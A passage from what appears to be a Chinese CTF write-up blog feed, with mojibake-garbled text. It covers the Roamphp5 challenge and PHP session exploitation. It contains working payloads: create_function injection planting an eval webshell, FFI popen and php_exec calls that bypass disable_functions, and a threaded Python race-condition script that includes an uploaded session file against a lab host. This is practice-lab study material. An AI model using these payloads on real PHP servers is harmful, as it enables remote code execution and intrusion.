&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223422195.png" alt="image-20211202223422195">&lt;/p>
&lt;p>é»˜è®¤æƒ…å†µä¸‹FFIåªä¼šè¢«ç”¨äºCLIæ¨¡å¼ä¸‹&amp;amp;é¢„åŠ è½½phpè„šæœ¬ï¼Œé™¤éè®¾ç½®&lt;code>ffi.enable=true&lt;/code>ï¼Œè®¾ç½®ä¹‹ååœ¨webshellå°±å¯ä»¥ç›´æ¥ç”¨èšå‰‘æ’ä»¶äº†&lt;/p>
&lt;h3 id="æå®¢å¤§æŒ‘æˆ˜-2020roamphp5-fighterfightsinvincibly">[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp5-FighterFightsInvincibly&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204173057497.png" alt="image-20211204173057497">&lt;/p>
&lt;p>å¾ˆæ¼‚äº®çš„å‰ç«¯ï¼Œçœ‹é¡µé¢æºç æœ‰æ³¨é‡Šçš„æç¤º&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204173130852.png" alt="image-20211204173130852">&lt;/p>
&lt;p>è¿™ä¸ªå½¢å¼ï¼ŒçœŸçš„æ˜¯ä¸€çœ¼&lt;code>create_function()&lt;/code>äº†ï¼Œçœ‹ä¸€ä¸‹phpinfo()ï¼Œç”¨çš„è¿˜æ˜¯&lt;code>create_function()&lt;/code>çš„æ³¨å…¥&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}phpinfo();/*
&lt;/code>&lt;/pre>&lt;p>çœ‹ä¸‹disable_function&lt;/p>
&lt;pre tabindex="0">&lt;code>system,exec,shell_exec,passthru,proc_open,proc_close,&amp;amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,&amp;amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,&amp;amp;nbsp;socket_connect,&amp;amp;nbsp;stream_socket_server,&amp;amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,&amp;amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,&amp;amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,&amp;amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,&amp;amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,&amp;amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,&amp;amp;nbsp;posix_getrlimit,&amp;amp;nbsp;posix_getsid,posix_getuid,posix_isatty,&amp;amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,&amp;amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname&amp;lt;/td&amp;gt;&amp;lt;td class=&amp;quot;v&amp;quot;&amp;gt;system,exec,shell_exec,passthru,proc_open,proc_close,&amp;amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,&amp;amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,&amp;amp;nbsp;socket_connect,&amp;amp;nbsp;stream_socket_server,&amp;amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,&amp;amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,&amp;amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,&amp;amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,&amp;amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,&amp;amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,&amp;amp;nbsp;posix_getrlimit,&amp;amp;nbsp;posix_getsid,posix_getuid,posix_isatty,&amp;amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,&amp;amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname
&lt;/code>&lt;/pre>&lt;p>ç›´æ¥ä¸ç”¨çœ‹äº†ï¼Œæœ‰ä¸€å¨ï¼Œè‚¯å®šå¾—ç»•è¿‡ï¼›èšå‰‘çš„å„ç§æ’ä»¶éƒ½å¤±è´¥ï¼Œå¾—æ‰‹åŠ¨ç»•ï¼Œffiæ‰©å±•å¼€ç€&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204174245283.png" alt="image-20211204174245283">&lt;/p>
&lt;p>çœ‹åˆ°è¿™é‡Œ&lt;code>ffi.enable=On&lt;/code>ï¼Œç¬¦åˆèšå‰‘æ’ä»¶çš„åº”ç”¨æ¡ä»¶ï¼Œå†™ä¸ªwebshellè¯•è¯•&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}eval($_POST[wuhu]);/*
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204175626714.png" alt="image-20211204175626714">&lt;/p>
&lt;p>what&amp;rsquo;s upï¼Œç«Ÿç„¶æ²¡æœ‰å›æ˜¾&lt;/p>
&lt;p>å°è¯•pingï¼Œå‘ç°è¿˜ä¸å‡ºç½‘ï¼Œä¸èƒ½ç”¨curlå¤–å¸¦flag&lt;/p>
&lt;p>é‚£åªèƒ½ä»FFIæœ¬èº«ä¸‹æ‰‹äº†ï¼Œè°ƒç”¨cçš„popen ç”¨ç®¡é“è¯»å‘½ä»¤æ‰§è¡Œçš„ç»“æœ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#111">FILE&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>popen&lt;/code>ä¼šè°ƒç”¨&lt;code>fork()&lt;/code>äº§ç”Ÿå­è¿›ç¨‹ï¼Œç„¶åä»å­è¿›ç¨‹ä¸­è°ƒç”¨&lt;code>/bin/sh -c&lt;/code>æ¥æ‰§è¡Œå‚æ•°çš„å‘½ä»¤ï¼Œtypeæœ‰r(read)å’Œw(write)ï¼Œä¾ç…§è¿™ä¸ªå€¼&lt;code>popen&lt;/code>ä¼šå»ºç«‹ç®¡é“è¿æ¥åˆ°å­è¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºè®¾å¤‡æˆ–å†™å…¥åˆ°å­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥è®¾å¤‡ä¸­&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}$ffi = FFI::cdef(&amp;quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&amp;quot;,&amp;quot;libc.so.6&amp;quot;);$o = $ffi-&amp;gt;popen(&amp;quot;ls / -lah&amp;quot;,&amp;quot;r&amp;quot;);$d = &amp;quot;&amp;quot;;while(($c = $ffi-&amp;gt;fgetc($o)) != -1){$d .= str_pad(strval(dechex($c)),2,&amp;quot;0&amp;quot;,0);}$ffi-&amp;gt;pclose($o);echo hex2bin($d);/*
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204180626497.png" alt="image-20211204180626497">&lt;/p>
&lt;p>å¦ä¸€ç§æ–¹æ³•æ˜¯è°ƒç”¨phpæºç ä¸­çš„å‡½æ•°&lt;code>php_exec()&lt;/code>ï¼Œå½“å®ƒçš„å‚æ•°typeä¸º3æ—¶å¯¹åº”è°ƒç”¨çš„æ˜¯&lt;code>passthru()&lt;/code>å‡½æ•°ï¼Œå…¶æ‰§è¡Œå‘½ä»¤å¯ä»¥å°†ç»“æœåŸå§‹è¾“å‡º&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}$ffi = FFI::cdef(&amp;quot;int php_exec(int type, char *cmd);&amp;quot;);$ffi-&amp;gt;php_exec(3,&amp;quot;ls /&amp;quot;);/*
&lt;/code>&lt;/pre>&lt;p>ä½†æ˜¯ï¼Œè¿™é“é¢˜åœ¨buuå¤ç°ä¸äº†ï¼ŒåŸå› æ˜¯uuidæœ‰32ä¸ªå­—ç¬¦ï¼ŒåŠ ä¸Šè¿å­—ç¬¦æœ‰36ä½ï¼Œå†åŠ ä¸Šflag{}æœ‰42ä½ï¼Œä½†æ˜¯/readflagç¨‹åºåªå…è®¸è¯»å‡º37ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æœ€åçš„5ä½æ˜¯è¯»ä¸å‡ºæ¥çš„ï¼ˆè¾£ä¸ªå”¯ä¸€è§£å¯èƒ½æ˜¯çˆ†ç ´çš„ æˆ‘è¯•ç€çˆ†äº†ä¸€ä¼š åŠ å»¶æ—¶å¾—è·‘å¥½ä¹…å¥½ä¹…å¥½ä¹… æ”¾å¼ƒäº†&lt;/p>
&lt;hr>
&lt;p>æœ€è¿‘åœ¨åˆ·buuojï¼Œæœ‰æœ›è¿™ä¸ªæœˆå†…æŠŠ50è§£ä»¥ä¸Šçš„é¢˜åšå®Œæ&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://wiki.php.net/rfc/preload">PHP RFC: Preloading&lt;/a> | &lt;a href="https://wiki.php.net/rfc/ffi">PHP RFC: FFI - Foreign Function Interface&lt;/a> | &lt;a href="https://wiki.php.net/rfc/custom_object_serialization">PHP RFC: New custom object serialization mechanism&lt;/a> | &lt;a href="https://www.laruence.com/2020/03/11/5475.html">PHP FFIè¯¦è§£ - ä¸€ç§å…¨æ–°çš„PHPæ‰©å±•æ–¹å¼&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://towardsdatascience.com/do-you-hate-how-slow-python-is-this-is-how-you-can-make-it-run-faster-532468fe1583">Do You Hate How Slow Python Is? This Is How You Can Make It Run Faster!&lt;/a> | &lt;a href="https://towardsdatascience.com/make-python-faster-with-cffi-python-bindings-eb5402bc35dd">Make Python Faster with CFFI Python Bindings&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://cffi.readthedocs.io/en/latest/">CFFI documentation&lt;/a> | &lt;a href="https://docs.python.org/3/library/ctypes.html">ctypes documentation&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.cnblogs.com/ccxikka/p/9637545.html">Python cffiå­¦ä¹  &lt;/a> | &lt;a href="https://github.com/wolever/python-cffi-example">cffi-example: an example project showing how to use Python&amp;rsquo;s CFFI&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">wp&lt;/a> | &lt;a href="http://www.lshhaisheng.com/2021/08/02/%E7%BB%95%E8%BF%87disable_function/">wp2&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>PHP_Sessionå­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2021/11/29/php-session-study-notes/</link><pubDate>Mon, 29 Nov 2021 22:23:42 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/29/php-session-study-notes/</guid><description>&lt;p>æåˆ°sessionï¼Œèƒ½æƒ³åˆ°ä»€ä¹ˆæï¼Ÿæ–‡ä»¶ä¸Šä¼ ï¼Œæ¡ä»¶ç«äº‰ï¼ŒsessionåŒ…å«ï¼Œååºåˆ—åŒ–â€¦â€¦ è®©æˆ‘ä»¬ä¸€ç‚¹ç‚¹è¯´&lt;/p>
&lt;hr>
&lt;h2 id="sessioné…ç½®ç®€è¿°">sessioné…ç½®&amp;amp;ç®€è¿°&lt;/h2>
&lt;p>ä»¥7.4.3ä¸ºä¾‹ï¼Œphp.iniä¸­å…³äºSessionæœ‰å‡ ä¸ªé»˜è®¤é¡¹&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>session.auto_start = 0&lt;/code>ï¼šé»˜è®¤ä¸å¯åŠ¨sessionï¼Œ*ä½†æ˜¯å¯ä»¥åœ¨phpè„šæœ¬ä¸­æ‰‹åŠ¨æ‰§è¡Œ&lt;code>session_start()&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.save_handler = files&lt;/code>ï¼šsessionä»¥æ–‡ä»¶å½¢å¼å­˜å‚¨&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.save_path=&amp;quot;&amp;quot;&lt;/code>ï¼šsessionæ–‡ä»¶å­˜å‚¨è·¯å¾„ æ–‡ä»¶åä¸º&lt;code>sess_PHPSESSID&lt;/code>&lt;/p>
&lt;p>linuxä¸‹é»˜è®¤å­˜å‚¨ä½ç½®ï¼›*å¯ä»¥è¢«ä¿®æ”¹&lt;/p>
&lt;pre tabindex="0">&lt;code>/var/lib/php/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID
/var/lib/php5/sess_PHPSESSID
/var/lib/php5/sessions/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>&lt;code>session.serialize_handler = php&lt;/code>ï¼šsessionçš„é»˜è®¤åºåˆ—åŒ–å¼•æ“æ˜¯php&lt;/p>
&lt;p>å…¶å®ä¸€å…±æœ‰3ç§ï¼Œ*phpå’Œphp_serializeè¿™ä¸¤ç§æ˜¯å¾ˆå¤šé¢˜çš„å…ƒå‡¶&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>åºåˆ—åŒ–å¼•æ“&lt;/th>
&lt;th>å­˜å‚¨æ–¹å¼&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>php&lt;/td>
&lt;td>é”®å|åºåˆ—åŒ–åå­—ç¬¦ä¸²&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>php_binary&lt;/td>
&lt;td>é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ï¼ˆä¼šæœ‰ä¸å¯æ˜¾ç¤ºçš„å­—ç¬¦ï¼‰+é”®å+ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>php_serialize(php&amp;gt;=5.5.4)&lt;/td>
&lt;td>å°†å­—ç¬¦ä¸²ååºåˆ—åŒ–å¤„ç†å¾—åˆ°çš„æ•°ç»„&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.enabled = On&lt;/code>ï¼šå½“æœ‰POSTä¸Šä¼ è¡Œä¸ºæ—¶ï¼Œæ­¤æ¬¡ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯ï¼ˆå¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰ï¼‰éƒ½ä¼šè¢«å­˜å‚¨åˆ°sessionä¸­&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.cleanup = On&lt;/code>ï¼šå½“POSTä¸Šä¼ å®Œæˆåï¼Œæ­¤æ¬¡çš„sessionæ–‡ä»¶å†…å®¹ä¼šè¢«ç«‹å³æƒ…å†µ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.prefix = &amp;quot;upload_progress_&amp;quot;&lt;/code>ï¼šå­˜å…¥sessionæ–‡ä»¶ä¸­çš„å‰ç¼€éƒ¨åˆ†&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.name = &amp;quot;PHP_SESSION_UPLOAD_PROGRESS&amp;quot;&lt;/code>ï¼šé»˜è®¤nameï¼Œ*å¯æ§å¯åˆ©ç”¨&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.use_strict_mode = 0&lt;/code>ï¼šè¡¨ç¤ºæˆ‘ä»¬å¯¹Cookieä¸­çš„PHPSESSIDå­—æ®µå¯æ§&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="æ–‡ä»¶åŒ…å«æ¡ä»¶ç«äº‰">æ–‡ä»¶åŒ…å«&amp;amp;æ¡ä»¶ç«äº‰&lt;/h2>
&lt;p>é»˜è®¤æƒ…å†µä¸‹&lt;code>session.use_strict_mode = 0&lt;/code>ï¼Œå½“æˆ‘ä»¬è®¾ç½®äº†Cookieçš„&lt;code>PHPSESSID&lt;/code>å­—æ®µåçš„å€¼valueåï¼Œphpä¼šè‡ªåŠ¨åˆ›å»ºsessionæ–‡ä»¶ï¼ˆé»˜è®¤è·¯å¾„&lt;code>/tmp/sess_PHPSESSID&lt;/code>ï¼‰ï¼›æ³¨æ„è¿™ä¸ªè¡Œä¸ºå¹¶ä¸éœ€è¦&lt;code>session.auto_start = On&lt;/code>æˆ–æ˜¯&lt;code>session_start()&lt;/code>æ¥æ‰‹åŠ¨å¼€å¯å°±ä¼šè¢«PHPè‡ªåŠ¨åˆå§‹åŒ–ä¸€ä¸ªsessionï¼Œå¹¶å°†prefix+valueå†™å…¥sess_PHPSESSIDæ–‡ä»¶ä¸­ï¼›æ•´ä¸ªæµç¨‹ä¸­valueå¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ¶æ„çš„payloadåŠ è½½åˆ°sessæ–‡ä»¶ä¸­ç„¶ååŒ…å«ï¼Œå¾—åˆ°rce&lt;/p>
&lt;p>è¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„ä¸Šä¼ è¡¨å•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;index.php&amp;#34;&lt;/span> &lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span> &lt;span style="color:#75af00">enctype&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;multipart/form-data&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;hidden&amp;#34;&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;PHP_SESSION_UPLOAD_PROGRESS&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;666666&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å½“ç„¶ä¸€èˆ¬çš„é¢˜ä¸ä¼šæœ‰è¿™ä¹ˆå•çº¯ï¼Œè¿˜ä¼šé…ä¸€ä¸ªé»˜è®¤é¡¹&lt;code>session.upload_progress.cleanup = On&lt;/code>ï¼›ä½†æ˜¯å¦‚æœæˆ‘ä»¬æ„é€ ä¸Šä¼ è¡¨å•æ—¶ä¼ çš„æ— ç”¨æ–‡ä»¶å¾ˆå¤§æ—¶å°±å¯ä»¥æ¥ä¸ªé¡¶çº§æ‹‰æ‰¯ï¼ˆæ¡ä»¶ç«äº‰ï¼‰ï¼Œåœ¨å®ƒè¢«æ¸…ç©ºå‰å…ˆåŒ…å«&amp;amp;rce&lt;/p>
&lt;h3 id="wmctf2020make-php-great-again">[WMCTF2020]Make PHP Great Again&lt;/h3>
&lt;p>å¼€å¹•æºç æš´å‡»&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">require_once&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag.php&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">require_once&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªé¢˜çš„éé¢„æœŸè§£ï¼šæ–‡ä»¶åŒ…å«+æ¡ä»¶ç«äº‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">threading&lt;/span>
&lt;span style="color:#111">sessid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;AMIZ&amp;#39;&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;cmd&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;system(&amp;#39;tac /var/www/html/flag.php&amp;#39;);&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;PHP_SESSION_UPLOAD_PROGRESS&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php eval($_POST[&amp;#34;cmd&amp;#34;]);?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz.txt&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">)},&lt;/span> &lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;PHPSESSID&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">sessid&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/?file=/tmp/sess_&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">sessid&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;amiz.txt&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">event&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">clear&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
